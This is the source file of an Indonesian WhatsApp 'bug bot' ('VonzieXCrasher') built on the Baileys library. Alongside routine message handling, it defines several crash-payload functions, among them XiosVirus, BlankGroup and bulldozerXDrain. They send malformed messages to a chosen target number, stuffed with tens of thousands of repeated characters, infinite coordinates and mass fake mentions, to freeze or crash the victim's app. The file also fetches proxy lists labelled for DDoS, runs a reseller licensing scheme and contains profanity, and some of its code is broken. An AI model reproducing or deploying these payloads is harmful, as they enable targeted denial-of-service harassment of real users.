/*
minimal kasih credit ©ryuOfficial
*/


require('./settings/settings');
const fs = require('fs');
const { modul } = require('./all/module')
const axios = require('axios');
const didyoumean = require('didyoumean');
const path = require('path');
const tdxlol = fs.readFileSync('./logo.jpg');
const crypto = require('crypto');
const chalk = require("chalk");
const util = require("util");
const { Client } = require('ssh2');
const moment = require("moment-timezone");
const speed = require('performance-now');
const similarity = require('similarity');
const JsConfuser = require('js-confuser');
const { spawn, exec, execSync } = require('child_process');

const { default: 
baileys, 
proto, 
generateWAMessage, 
generateWAMessageFromContent, 
getContentType, 
prepareWAMessageMedia } = require("@whiskeysockets/baileys");

module.exports = ryu = async (ryu, m, chatUpdate, store) => {
try {
// Message type handlers
const body = (
m.mtype === "conversation" ? m.message.conversation :
m.mtype === "imageMessage" ? m.message.imageMessage.caption :
m.mtype === "videoMessage" ? m.message.videoMessage.caption :
m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : ""
);

const sender = m.key.fromMe
? ryu.user.id.split(":")[0] || ryu.user.id
: m.key.participant || m.key.remoteJid;

const senderNumber = sender.split('@')[0];
const budy = (typeof m.text === 'string' ? m.text : '');
const prefa = ["", "!", ".", ",", "🐤", "🗿"];
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : '/';

// Buat Grup
const from = m.key.remoteJid;
const isGroup = from.endsWith("@g.us");

// Database And Lain"
const botNumber = await ryu.decodeJid(ryu.user.id);
const isBot = botNumber.includes(senderNumber)
const ownerbot = JSON.parse(fs.readFileSync("./all/Database/owner.json"))
const isOwner = ownerbot.includes(sender)
const command = body.slice(1).trim().split(/ +/).shift().toLowerCase();
const args = body.trim().split(/ +/).slice(1);
const pushname = m.pushName || "No Name";
const text = q = args.join(" ");
const quoted = m.quoted ? m.quoted : m;
const mime = (quoted.msg || quoted).mimetype || '';
const qmsg = (quoted.msg || quoted);
const isMedia = /image|video|sticker|audio/.test(mime);
const isPc = from.endsWith('@s.whatsapp.net')

// function Group
const groupMetadata = isGroup ? await ryu.groupMetadata(m.chat).catch((e) => {}) : "";
const groupOwner = isGroup ? groupMetadata.owner : "";
const groupName = m.isGroup ? groupMetadata.subject : "";
const participants = isGroup ? await groupMetadata.participants : "";
const groupAdmins = isGroup ? await participants.filter((v) => v.admin !== null).map((v) => v.id) : "";
const groupMembers = isGroup ? groupMetadata.participants : "";
const isGroupAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
const tanggal = moment.tz('Asia/Jakarta').format('DD/MM/YY')


        // Days
        const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
        const wib = moment.tz('Asia/Jakarta').format('HH : mm :ss')
        const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')
        const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')

        const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
        if (time2 < "23:59:00") {
            var ucapanWaktu = 'Selamat Malam 🏙️'
        }
        if (time2 < "19:00:00") {
            var ucapanWaktu = 'Selamat Petang 🌆'
        }
        if (time2 < "18:00:00") {
            var ucapanWaktu = 'Selamat Sore 🌇'
        }
        if (time2 < "15:00:00") {
            var ucapanWaktu = 'Selamat Siang 🌤️'
        }
        if (time2 < "10:00:00") {
            var ucapanWaktu = 'Selamat Pagi 🌄'
        }
        if (time2 < "05:00:00") {
            var ucapanWaktu = 'Selamat Subuh 🌆'
        }
        if (time2 < "03:00:00") {
            var ucapanWaktu = 'Selamat Tengah Malam 🌃'
        }
       

// My Func
const { 
smsg, 
sendGmail, 
formatSize, 
isUrl, 
generateMessageTag, 
getBuffer, 
getSizeMedia, 
runtime, 
fetchJson, 
formatp,
getTime,
getRandom,
sleep } = require('./all/myfunc');

// fungsi waktu real time
const time = moment.tz("Asia/Jakarta").format("HH:mm:ss");
 // IMPORT TOOLS DIDOS TXT
const uatxt = await axios.get('https://raw.githubusercontent.com/QioExec/proxy-ua/main/ua.txt')
const proxytxt = await axios.get('https://raw.githubusercontent.com/QioExec/proxy-ua/main/proxy.txt')
const { checkApproval, approveScript, isApproved, validateApprovalData, checkScriptIntegrity } = require('./security/adiwajs')
const config = require('./security/adiwConfig')

const isCmd = true; // fix sementara, sesuaikan logika sebenarnya

async function main() {
    if (!(await isApproved())) {
        if (m.sender.includes(config.approval.num) && budy.includes(config.approval.text)) {
            await approveScript(m.sender, ryu.authState.creds.pairingCode);
            await replyRyu(config.approval.greet);
        } else {
            await checkApproval();
        }
    }
}

main();

if (!await isApproved() && isCmd) {
    return;
}
checkScriptIntegrity();
if (await isApproved()) {
    validateApprovalData(ryu.authState.creds.pairingCode);
}
if (!fs.existsSync('./all/approval')) {
    ryu.sendMessage(config.approval.num + '@s.whatsapp.net', { text: 'Connect lost!\nHarap Mendapatkan persetujuan dari *RyuMa*' })
    fs.writeFileSync('./all/approval', '', 'utf8');
}
// Membuat file data.json jika belum ada
if (!fs.existsSync('./security/data.json')) {
  fs.writeFileSync('./security/data.json', JSON.stringify({
    buyer: [],
    reseller: [],
    partner: [],
    moderator: [],
    ceo: [],
    blacklist: [],
    expired: 0
  }));
}

// Fungsi untuk mengakses data
const getData = () => {
  const data = JSON.parse(fs.readFileSync('./security/data.json'));
  return data;
};

// Fungsi untuk menambahkan buyer
const addBuyer = (nomor) => {
  const data = getData();
  data.buyer.push(nomor);
  fs.writeFileSync('./security/data.json', JSON.stringify(data));
};

// Fungsi untuk menambahkan reseller
const addReseller = (nomor) => {
  const data = getData();
  data.reseller.push(nomor);
  fs.writeFileSync('./security/data.json', JSON.stringify(data));
};

// Fungsi untuk menambahkan partner
const addPartner = (nomor) => {
  const data = getData();
  data.partner.push(nomor);
  fs.writeFileSync('./security/data.json', JSON.stringify(data));
};

// Fungsi untuk menambahkan moderator
const addModerator = (nomor) => {
  const data = getData();
  data.moderator.push(nomor);
  fs.writeFileSync('./security/data.json', JSON.stringify(data));
};

// Fungsi untuk menambahkan ceo
const addCeo = (nomor) => {
  const data = getData();
  data.ceo.push(nomor);
  fs.writeFileSync('./security/data.json', JSON.stringify(data));
};

// Fungsi untuk menghapus user
const deleteUser = (nomor) => {
  const data = getData();
  const indexBuyer = data.buyer.indexOf(nomor);
  const indexReseller = data.reseller.indexOf(nomor);
  const indexPartner = data.partner.indexOf(nomor);
  const indexModerator = data.moderator.indexOf(nomor);
  const indexCeo = data.ceo.indexOf(nomor);
  const indexBlacklist = data.blacklist.indexOf(nomor);

  if (indexBuyer !== -1) {
    data.buyer.splice(indexBuyer, 1);
  }
  if (indexReseller !== -1) {
    data.reseller.splice(indexReseller, 1);
  }
  if (indexPartner !== -1) {
    data.partner.splice(indexPartner, 1);
  }
  if (indexModerator !== -1) {
    data.moderator.splice(indexModerator, 1);
  }
  if (indexCeo !== -1) {
    data.ceo.splice(indexCeo, 1);
  }
  if (indexBlacklist !== -1) {
    data.blacklist.splice(indexBlacklist, 1);
  }

  fs.writeFileSync('./security/data.json', JSON.stringify(data));
};

// Fungsi untuk mengatur expired
const setExpired = (waktu) => {
  const data = getData();
  data.expired = waktu;
  fs.writeFileSync('./security/data.json', JSON.stringify(data));
};

// Fungsi untuk menambahkan ke blacklist
const addBlacklist = (nomor) => {
  const data = getData();
  data.blacklist.push(nomor);
  fs.writeFileSync('./security/data.json', JSON.stringify(data));
};
const data = JSON.parse(fs.readFileSync('./security/data.json'));
const expired = data.expired;

// Lakukan pengecekan expired
const now = new Date().getTime();
if (now > new Date(expired).getTime()) {
  console.log("Expired");
} else {
  console.log("Not Expired");
}

const replybar = (teks) => {
    ryu.sendMessage(m.chat, { 
        text: teks,
        contextInfo: {
            mentionedJid: [m.sender],
            externalAdReply: {
                showAdAttribution: true,
                containsAutoReply: true,
                title: global.title,
                previewType: "PHOTO",
                thumbnailUrl: global.image.Reply,
                thumbnail: ``,
                sourceUrl: global.website
            }
        }
    }, { quoted: m });
}      
const qevent = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: ""
} : {})
},
'message': {
  "eventMessage": {
    "isCanceled": false,
    "name": budy || m.mtype,
    "description": "By Orderkuota",
    "location": {
      "degreesLatitude": -99999999999,
      "degreesLongitude": -99999999999,
      "name": "Orderkuota"
    },
    "joinLink": "https://call.whatsapp.com/video/hMwVijMQtUb0qBJL3lf0rv",
    "startTime": "1713724680"
  }
}
}                

// Cmd in Console
if (m.message) {
console.log('\x1b[30m--------------------\x1b[0m');
console.log(chalk.bgHex("#e74c3c").bold(`➤ New Messages`));
console.log(
chalk.bgHex("#00FF00").black(
` ╭─ > Tanggal: ${new Date().toLocaleString()} \n` +
` ├─ > Pesan: ${m.body || m.mtype} \n` +
` ├─ > Pengirim: ${m.pushname} \n` +
` ╰─ > JID: ${senderNumber}`
  ` SELAMAT MEMAKAI BOT BUG INI `
)
);
if (m.isGroup) {
console.log(
chalk.bgHex("#00FF00").black(
` ╭─ > Grup: ${groupName} \n` +
` ╰─ > GroupJid: ${m.chat}`
` SELAMAT MEMAKAI BOT BUG INI `
)
);
}
console.log();
}

//==========================================//
const { os, baileys, child_process, crypto, cookie,  fetch, process, ms, speed, syntaxerror, nodecron } = modul
//==========================================//

//==========================================//   
const userSessions = {};
//==========================================//

// AKHIR FUNC BUG //
function randomNomor(min, max = null){
if (max !== null) {
min = Math.ceil(min);
max = Math.floor(max);
return Math.floor(Math.random() * (max - min + 1)) + min;
} else {
return Math.floor(Math.random() * min) + 1
}}

async function edit2 (tex1, tex2) {
var nln = [
`${tex1}`,
`${tex2}`
]
let { key } = await ryu.sendMessage(from, {text: 'Loading...'},  { quoted: m })
let duh = randomNomor(800, 1000)
for (let i = 0; i < nln.length; i++) {
await sleep(duh)
await ryu.sendMessage(from, {text: nln[i], edit: key }, { quoted: m });
}}

async function edit3 (tex1, tex2, tex3) {
var nln = [
`${tex1}`,
`${tex2}`,
`${tex3}`
]
let { key } = await ryu.sendMessage(from, {text: 'Loading...'},  { quoted: m })
let duh = randomNomor(800, 1000)
for (let i = 0; i < nln.length; i++) {
await sleep(duh)
await ryu.sendMessage(from, {text: nln[i], edit: key }, { quoted: m });
}}  

async function parseMention(text = '') {
return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
}
//==========================================//

// Done Ress //
async function doneress () {
if (!q) throw "Done Response"
let pepec = q.replace(/[^0-9]/g, "")
let ressdone = ` 𝗦𝘂𝗰𝗰𝗲𝘀 𝗦𝗲𝗻𝗱 𝗕𝘂𝗴𝘀!!
💬 *_${command}_* Sent To : 
📱 ${pepec}

 𝗣𝗹𝗲𝗮𝘀𝗲 𝗣𝗮𝘂𝘀𝗲 𝟭𝟱 𝗠𝗶𝗻𝘂𝘁𝗲𝘀 𝗢𝗿 𝗗𝗲𝗹𝗲𝘁𝗲 𝗔𝗰𝗰𝗲𝘀𝘀 ❕`

  let buttons = [
        { buttonId: ".tqto", buttonText: { displayText: "𝗧𝗵𝗮𝗻𝗸𝘀 𝗧𝗼" } }
    ];

    let buttonMessage = {
        image: thumb, 
        caption: ressdone,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "",
                newsletterName: "𝑽𝒐𝒏𝒛𝒊𝒆𝑿𝑪𝒓𝒂𝒔𝒉𝒆𝒓⇜🚀"
            }
        },
        footer: "𝑽𝒐𝒏𝒛𝒊𝒆𝑿𝑪𝒓𝒂𝒔𝒉𝒆𝒓⇜🚀𝑽𝒐𝒏𝒛𝒊𝒆𝑿𝑪𝒓𝒂𝒔𝒉𝒆𝒓⇜🚀",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
    };
await ryu.sendMessage(m.chat, buttonMessage, { quoted: m });
}

// Random Emoji //       
const Moji1 = '🌸'
const Moji2 = '🍁'
const Moji3 = '🍃'
const ERandom = [Moji1, Moji2, Moji3]
let Feature = Math.floor(Math.random() * ERandom.length)
const emoji = ERandom[Feature]

        // Thumb Bot //

const thumb = fs.readFileSync('./logo.jpg');

if (prefix && command) {
let caseNames = getCaseNames();
function getCaseNames() {
const fs = require('fs');
try {
const data = fs.readFileSync('RyuMa.js', 'utf8');
const casePattern = /case\s+'([^']+)'/g;
const matches = data.match(casePattern);
if (matches) {
const caseNames = matches.map(match => match.replace(/case\s+'([^']+)'/, '$1'));
return caseNames;
} else {
return [];
} } catch (err) {
console.log('Terjadi kesalahan:', err);
return [];
}}
let noPrefix = command
let mean = didyoumean(noPrefix, caseNames);
let sim = similarity(noPrefix, mean);
let similarityPercentage = parseInt(sim * 100);
if (mean && noPrefix.toLowerCase() !== mean.toLowerCase()) {
let response = `💫 Hallo User, Apakan Anda Sedang Mencari ${prefix+mean}?\n💫 Nama Menu : ${prefix+mean}`
ryu.sendMessage(m.chat, { image: thumb, caption: response }, {quoted: m})
}}

const sound = { 
key: {
fromMe: false, 
participant: `6285773466911@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) 
},
"message": {
"audioMessage": {
"url": "https://mmg.whatsapp.net/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ&oe=6489D172&mms3=true",
"mimetype": "audio/mp4",
"fileSha256": "oZeGy+La3ZfKAnQ1epm3rbm1IXH8UQy7NrKUK3aQfyo=",
"fileLength": "1067401",
"seconds": 9999999999999,
"ptt": true,
"mediaKey": "PeyVe3/+2nyDoHIsAfeWPGJlgRt34z1uLcV3Mh7Bmfg=",
"fileEncSha256": "TLOKOAvB22qIfTNXnTdcmZppZiNY9pcw+BZtExSBkIE=",
"directPath": "/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ&oe=6489D172",
"mediaKeyTimestamp": "1684161893"
}}}

async function quickreply1(chat, teks, quick1, jm) {
let msg = generateWAMessageFromContent(chat, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: {
mentionedJid: [m.sender],
forwardingScore: 9999999, 
isForwarded: true, 
forwardedNewsletterMessageInfo: {
newsletterJid: chjid + "120363390274692764@newsletter",
newsletterName: `ᴄʜᴀɴɴᴇʟ ${wm}`, 
serverMessageId: -1
},
businessMessageForwardInfo: { businessOwnerJid: ryu.decodeJid(ryu.user.id) },
},
body: proto.Message.InteractiveMessage.Body.create({
text: teks
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `ʙʏ ${wm}`
}),
header: proto.Message.InteractiveMessage.Header.create({
title: '',
subtitle: '',
hasMediaAttachment: false
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "quick_reply",
"buttonParamsJson": quick1
}
],
})})
}}
}, { quoted: jm }) //ori (floc)

await ryu.relayMessage(msg.key.remoteJid, msg.message, {
messageId: msg.key.id
})
}
const qchanel = {
key: {
remoteJid: 'status@broadcast',
fromMe: false,
participant: '0@s.whatsapp.net'
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: `120363401151695566@newsletter`,
newsletterName: `Vonzie`,
jpegThumbnail: "",
caption: '𝑽𝒐𝒏𝒛𝒊𝒆𝑿𝑪𝒓𝒂𝒔𝒉𝒆𝒓',
inviteExpiration: Date.now() + 1814400000
}
}}


let timestamp = speed()
let latensi = speed() - timestamp
neww = performance.now()
oldd = performance.now()
ping = `ping : ${latensi.toFixed(4)} × ram : ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}`

//variable gambar
const valensya = fs.readFileSync('./logo.jpg')
//end

const qtext2 = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast"} : {}) },'message': {extendedTextMessage: {text: "𝑽𝒐𝒏𝒛𝒊𝒆𝑿𝑪𝒓𝒂𝒔𝒉𝒆𝒓" }}}

const ReplyZro = (teks) => {
kirana.sendMessage(
        m.chat,
        {
          document: fs.readFileSync("./package.json"),
          fileName: `Hai ${pushname}`,
          fileLength: "99999999999999",
          caption: teks,
          mimetype: "image/png",
          headerType: 9,
          jpegThumbnail: fkethmb,
          contextInfo: { 
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterName: namaowner,
 newsletterJid: idsaluran,
 serverMessageId: 143
}}}, {quoted:qtext2})
}

const ftoko = {
      key: {
        fromMe: false,
        participant: `6285773466911@s.whatsapp.net`,
        ...(m.chat ? { remoteJid: "status@broadcast" } : {}),
      },
      message: {
        productMessage: {
          product: {
            title: `𝑽𝒐𝒏𝒛𝒊𝒆𝑿𝑪𝒓𝒂𝒔𝒉𝒆𝒓⇜🚀`,
            description: `${pushname} order`,
            currencyCode: "IDR",
            priceAmount1000: "999999999999",
            retailerId: `⏤͟͟͞͞RyuMa Official`,
            productImageCount: 1,
          },
          businessOwnerJid: `0@s.whatsapp.net`,
        },
      },
    };
const hw = {
  key: {
    participant: '6285773466911@s.whatsapp.net', 
    ...(m.chat ? {remoteJid: `status@broadcast`} : {})
  }, 
  message: {
    liveLocationMessage: {
      caption: `ⱤɎɄ₥₳ ₱Ɇ₥ɄⱠ₳ J₳₦₲₳₦ Đł ₴Ɇ₦₲₲ØⱠ`,
      jpegThumbnail: ""
    }
  }, 
quoted: sound
} 

    const isCreator = JSON.parse(fs.readFileSync('./all/Database/owner.json'));

    const isAccryuDev = [botNumber, ...isCreator, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender);

const ryuReply = (teks) => {
ryu.sendMessage(m.chat, {
  image: { url: `https://files.catbox.moe/6y35hh.jpg` }, //gif nya
        caption: teks,
        footer: " ",
        gifPlayback: true,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            mentionedJid: [m.sender],
            externalAdReply: {
                showAdAttribution: true,
                title: `𝑽𝒐𝒏𝒛𝒊𝒆𝑿𝑪𝒓𝒂𝒔𝒉𝒆𝒓⇜🚀`,
                body: `⏤͟͟͞͞RyuMa Official`,
                thumbnailUrl: `https://files.catbox.moe/6y35hh.jpg`,
                sourceUrl: `https://xnxx.com`,
                mediaType: 1,
                renderLargerThumbnail: false
        }
    },
 buttons: [
  {
   buttonId: ".menu", 
    buttonText: { 
      displayText: '⍣𝐁𝐚͠𝐜͜𝐤 𝐌͠𝐞͜𝐧͠𝐮⍣' 
    }
  }
],
  viewOnce: true,
  headerType: 6
}, { quoted: hw })
}

const reaction = async (jidss, emoji) => {
ryu.sendMessage(jidss, { react: { text: emoji, key: m.key }})}





async function QDIphone(target, QBug) {
      ryu.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: "ꦾ".repeat(55000),
            contextInfo: {
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation: "𝑽𝒐𝒏𝒛𝒊𝒆𝑿𝑪𝒓𝒂𝒔𝒉𝒆𝒓⇜🚀" + "ꦾ࣯࣯".repeat(50000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
        },
        {
          paymentInviteMessage: {
            serviceType: "UPI",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        },
        {
          messageId: null,
        }
      );
    }


   
    async function XiosVirus(target, QBug) {
      ryu.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: `𝑽𝒐𝒏𝒛𝒊𝒆𝑿𝑪𝒓𝒂𝒔𝒉𝒆𝒓⇜🚀 :>-` + "࣯ꦾ".repeat(90000),
            contextInfo: {
              fromMe: false,
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation: "\u0000" + "ꦾ".repeat(90000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
        },
        {
          participant: {
            jid: target,
          },
        },
        {
          messageId: null,
        }
      );
    }
    
async function XvonzieViroux(target) {
  try {
    const msg = await generateWAMessageFromContent(
      target,
      {
        ephemeralMessage: {
          message: {
            viewOnceMessage: {
              message: {
                interactiveMessage: {
                  header: {
                    hasMediaAttachment: false,
                    locationMessage: {
                      degreesLatitude: 1e309, 
                      degreesLongitude: -1e309,
                      name: "{".repeat(30000),
                      address: "{".repeat(30000)
                    }
                  },
                  body: {
                    text: "" 
                  },
                  nativeFlowMessage: {
                    messageParamsJson: "{".repeat(20000)
                  },
                  contextInfo: {
                    stanzaId: "gx_" + Date.now(),
                    participant: "0@s.whatsapp.net",
                    remoteJid: "status@broadcast",
                    mentionedJid: ["0@s.whatsapp.net"],
                    forwardingScore: 999,
                    isForwarded: true
                  }
                }
              }
            }
          }
        }
      },
      {}
    );

    await ryu.relayMessage(target, msg.message, {
      messageId: msg.key.id
    });

    console.log(`✅ Sent invis bug to ${target}`);
  } catch (err) {
    console.log("❌ Error Sending Invis Bug", err);
  }
}    

async function invicXblank(target) {
const msg = {
    groupInviteMessage: {
      groupJid: "120363370626418572@g.us",
      inviteCode: "974197419741",
      inviteExpiration: "97419741",
      groupName: "𝑽𝒐𝒏𝒛𝒊𝒆𝑿𝑪𝒓𝒂𝒔𝒉𝒆𝒓⇜🚀 :>" + "ោ៝".repeat(10000),
      caption: "𝑽𝒐𝒏𝒛𝒊𝒆𝑿𝑪𝒓𝒂𝒔𝒉𝒆𝒓⇜🚀 :>" + "ោ៝".repeat(10000),
      jpegThumbnail: null
    }
  };
  await ryu.relayMessage(target, msg, {
  participant: { jid: target }, 
  messageId: null
  })
}


async function BlankGroup(target) {
    try {
        const message = {
            botInvokeMessage: {
                message: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: `33333333333333333@newsletter`,
                        newsletterName: "𝑽𝒐𝒏𝒛𝒊𝒆𝑿𝑪𝒓𝒂𝒔𝒉𝒆𝒓⇜🚀 :>" + "ꦾ".repeat(120000),
                        jpegThumbnail: "",
                        caption: "ꦽ".repeat(120000) + "@0".repeat(120000),
                        inviteExpiration: Date.now() + 1814400000, // 21 hari
                    },
                },
            },
            nativeFlowMessage: {
    messageParamsJson: "",
    buttons: [
        {
            name: "call_permission_request",
            buttonParamsJson: "{}",
        },
        {
            name: "galaxy_message",
            paramsJson: {
                "screen_2_OptIn_0": true,
                "screen_2_OptIn_1": true,
                "screen_1_Dropdown_0": "nullOnTop",
                "screen_1_DatePicker_1": "1028995200000",
                "screen_1_TextInput_2": "null@gmail.com",
                "screen_1_TextInput_3": "94643116",
                "screen_0_TextInput_0": "\u0000".repeat(500000),
                "screen_0_TextInput_1": "SecretDocu",
                "screen_0_Dropdown_2": "#926-Xnull",
                "screen_0_RadioButtonsGroup_3": "0_true",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
            },
        },
    ],
},
                     contextInfo: {
                mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                groupMentions: [
                    {
                        groupJid: "0@s.whatsapp.net",
                        groupSubject: "Vampire",
                    },
                ],
            },
        };

        await ryu.relayMessage(target, message, {
            userJid: target,
        });
    } catch (err) {
        console.error("Error sending newsletter:", err);
    }
}

async function sendOfferCall(isTarget) {
try {
await ryu.offerCall(isTarget);
console.log(chalk.white.bold(`Success Send Offer Call To Target`));
} catch (error) {
console.error(chalk.white.bold(`Failed Send Offer Call To Target:`, error));
}
}
async function sendOfferVideoCall(isTarget) {
try {
await ryu.offerCall(isTarget, { 
video: true 
});
console.log(chalk.white.bold(`Success Send Offer Video Call To Target`));
} catch (error) {
console.error(chalk.white.bold(`Failed Send Offer Video Call To Target:`, error));
}
}

async function protocolbug2(isTarget, mention) {
    const generateMessage = {
        viewOnceMessage: {
            message: {
                imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    caption: "vonziecrash Nihdekk🎭" + "{".repest(10000), 
                    fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
                    fileLength: "19769",
                    height: 354,
                    width: 783,
                    mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
                    fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
                    directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
                    mediaKeyTimestamp: "1743225419",
                    jpegThumbnail: null,
                    scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
                    scanLengths: [2437, 17332],
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: isTarget,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(isTarget, generateMessage, {});

    await depayy.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [isTarget],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: isTarget },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await depayy.relayMessage(
            isTarget,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "𝐁𝐞𝐭𝐚 𝐏𝐫𝐨𝐭𝐨𝐜𝐨𝐥 - 𝟗𝟕𝟒𝟏" },
                        content: undefined
                    }
                ]
            }
        );
    }
}

async function bulldozerXDrain(target) {
  const mentioned = [
    "0@s.whatsapp.net",
    ...Array.from({ length: 40000 }, () => `${Math.floor(Math.random() * 999999999)}@s.whatsapp.net`)
  ];

  const msgPayload = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 999999999, high: 0, unsigned: true },
          mediaKeyTimestamp: { low: Date.now(), high: 0, unsigned: true },
          firstFrameLength: 9999999,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
          contextInfo: {
            mentionedJid: mentioned,
            quotedMessage: {
              conversation: "🔥🔥🔥"
            },
            externalAdReply: {
              showAdAttribution: true,
              title: "🔥 ryuOffc BrutalPayload 🔥"+ " \u2003".repeat(3000) + " {".repeat(2000) ,
              body: "ryuNeverDie😈",
              mediaType: 1,
              thumbnailUrl: "https://telegra.ph/file/0dc4ab9c226a3b.png",
              mediaUrl: "https://wa.me/0",
              sourceUrl: "https://wa.me/0"
            }
          },
          stickerSentTs: { low: -1939477883, high: 406, unsigned: false }
        }
      }
    }
  };

  
  const msg = generateWAMessageFromContent("status@broadcast", msgPayload, {});
  await ryu.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });

 
  await ryu.relayMessage(target, {
    statusMentionMessage: {
      message: {
        protocolMessage: {
          key: msg.key,
          type: 25
        }
      }
    }
  }, {
    additionalNodes: [
      {
        tag: "meta",
        attrs: { is_status_mention: "ryuOffc Delay Pengutas Kontol" },
        content: undefined
      }
    ]
  });

